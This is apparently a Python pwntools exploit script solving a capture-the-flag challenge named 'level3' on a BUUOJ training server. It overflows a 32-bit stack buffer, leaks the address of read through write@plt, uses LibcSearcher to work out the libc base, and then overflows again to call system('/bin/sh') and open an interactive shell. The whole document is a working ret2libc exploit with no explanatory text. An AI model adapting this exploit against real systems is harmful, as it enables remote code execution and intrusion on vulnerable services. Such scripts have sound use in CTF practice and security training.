from pwn import *
from LibcSearcher import *
context.arch='i386'

# p = process('./level3')
p = remote('node3.buuoj.cn',26889)
elf = ELF('./level3',checksec=False)

read_got = elf.got['read']
write_plt = elf.plt['write']
main = elf.sym['main']

p.recvuntil('Input:')

payload = 'A'*(0x88+4)
payload += flat([write_plt, main, 1, read_got, 10])
p.send(payload)
p.recv()
# read the trash message

read_addr = u32(p.recv(4))
log.success('read_addr = %#x',read_addr)

libc = LibcSearcher('read',read_addr)
libc_base = read_addr - libc.dump('read')
system_addr = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')
log.info('system_addr = %#x, binsh = %#x'%(system_addr,binsh))

payload = 'A'*(0x88+4)
payload += flat([system_addr, main, binsh])
p.send(payload)
sleep(1)
p.interactive()
